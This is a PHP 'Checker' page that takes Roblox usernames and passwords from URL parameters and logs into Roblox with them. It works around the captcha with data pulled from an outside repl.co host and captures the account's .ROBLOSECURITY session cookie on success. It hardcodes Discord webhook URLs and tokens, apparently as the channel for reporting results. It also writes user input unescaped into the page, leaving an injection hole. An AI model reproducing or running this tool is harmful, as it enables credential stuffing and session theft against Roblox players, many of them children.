<?php
include ('library/Requests.php');

$username = $_GET["username"];
$password = $_GET["password"];
$success = "https://discord.com/api/webhooks/705695936457867357/9dvOy5BrlSY0cWZtr1zI0QTfsA5wuRfxC6_xfY3DTZtIwSfmGpWTdF_pXju6zKSUzQ0e";
$failed = "https://discord.com/api/webhooks/705695936457867357/9dvOy5BrlSY0cWZtr1zI0QTfsA5wuRfxC6_xfY3DTZtIwSfmGpWTdF_pXju6zKSUzQ0e";
$new_pass = "";

Requests::register_autoloader();
$session = new Requests_Session('https://www.roblox.com');
$session->useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';
$response = $session->post("https://auth.roblox.com/v2/login");
$xcsrftoken = $response->headers["x-csrf-token"];
$session->headers["x-csrf-token"] = $xcsrftoken;
$session->headers["Accept"] = "application/json, text/plain, */*";
$session->headers["Content-Type"] = "application/json;charset=utf-8";
$session->headers["Origin"] = "https://www.roblox.com";
$session->headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36";

if ($_SERVER["REQUEST_METHOD"] == "POST")
{
    $captchacode = $_POST["captchainfo"];
    $splitcaptcha = explode(",", $captchacode);
    $captchatoken = $splitcaptcha[1];
    $fcid = $splitcaptcha[0];
    $username = $_POST["username"];
    $password = $_POST["password"];
    $logindata = [
      "cvalue" => $username,
      "ctype" => "Username",
      "password" => $password,
      "captchaId" => $fcid,
      "captchaToken" => $captchatoken,
      "captchaProvider" => 
      "PROVIDER_ARKOSE_LABS", 
    ];
    $loginresponse = $session->post("https://auth.roblox.com/v2/login", array() , json_encode($logindata));
    if ($loginresponse->status_code == 200 and !json_decode($loginresponse->body,true)["twoStepVerificationData"])
    {
        $homeresponse = $session->get("https://www.roblox.com/home");
        $cookie = $session->cookies[".ROBLOSECURITY"];
        echo '<script type="text/javascript">';
        echo 'setTimeout(function () { swal("Checker","Login Successfully","success");';
        echo '}, 1000);</script>';
        include ("success.php");
    }
    else
    {
        $errorcode = json_decode($loginresponse->body)->errors[0]->code;
        if ($errorcode == 2) {
            $description = "Captcha Failed!";
        }
        if ($errorcode == 1) {
            $description = "Password Not Working!";
        }
        if ($loginresponse->status_code == 200) {
            $description = "2FA set on account";
        }
        if (isset($errorcode) and !isset($description)) {
            $description = json_decode($loginresponse->body)->errors[0]->message;
        }
        echo '<script type="text/javascript">';
        echo 'setTimeout(function () { swal("Checker","'.$description.'","error");';
        echo '}, 1000);</script>';
        include ("failed.php");
    }
}
?>
<html>
<head>
    <title>Checker</title>
    <meta name="referrer" content="no-referrer">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <!-- Sweet Alert-->
    <link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@3/dark.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/6.10.2/sweetalert2.all.min.js"></script>
    <script src="https://roblox-api.arkoselabs.com/fc/api/?onload=SpurX" async=""></script>
    <script>
        let userStartedFunCaptchaTime;

        function SpurX() {
            var BolokParams = new FunCaptcha({
                public_key: '476068BF-9607-4799-B53D-966BE98E2B81?public_key=476068BF-9607-4799-B53D-966BE98E2B81&simulate_rate_limit=0&site=https://www.roblox.com',
                language: 'en',
                data: { blob: document.getElementById("captchaBlob").value },
                callback: (token) => {
                    // this is where we do verification with server
                    let userSolveFunCaptchaTime = null;
                    if (userStartedFunCaptchaTime) {
                      userSolveFunCaptchaTime = timestamp() - userStartedFunCaptchaTime;
                      userStartedFunCaptchaTime = null;
                    }

                    var captchatoken = token;
                    var unifiedCaptchaId = document.getElementById("captchaID").value;

                    if (BolokParams.getSessionToken() === captchatoken) {
                        setTimeout(() => {
                            document.getElementById("captchadata").setAttribute('value', unifiedCaptchaId + ',' + captchatoken)
                            document.getElementById("checkerform").submit()
                    }, "1000")
                    } else {
                        setTimeout(() => {
                            window.location.replace("index.php")
                    }, "1000")
                    }
                },
                target_html: 'Captcha',
            })
        }

        function timestamp() {
            return new Date().valueOf();
        }
    </script>
    <style>
    body {
        background-image: url('');
        background-repeat: no-repeat;
        background-attachment: fixed;
        background-size: cover;
    }
    </style>
</head>
<body>
<center>
<?php
if ($_SERVER["REQUEST_METHOD"]=="GET") {
// If you dont have link in $captchainfo DM --> Lil.Bolok#0001
// The $captchainfo link is to prevent the LC from toomanyrequests
$captchainfo = file_get_contents("https://flakythoroughconditions.tkck.repl.co/api", false);
// Using 000webhoost is forbidden cuz it'll break the code --SpurX
$fieldData = json_decode($captchainfo, true);
$captchaid = $fieldData["captchaId"];
$captchablob = $fieldData["captchaBlob"];
echo '
<center>
  <div id="Captcha"></div>
</center>
<form method="POST" id="checkerform">
    <input hidden="true" name="captchainfo" id="captchadata" value="">
    <input type="hidden" name="username" value="'.$username.'">
    <input type="hidden" name="password" value="'.$password.'">
    <input hidden="true" id="captchaID" value="'.$captchaid.'">
    <input hidden="true" id="captchaBlob" value="'.$captchablob.'">
</form>';
}
?>
</center>
</body>
</html>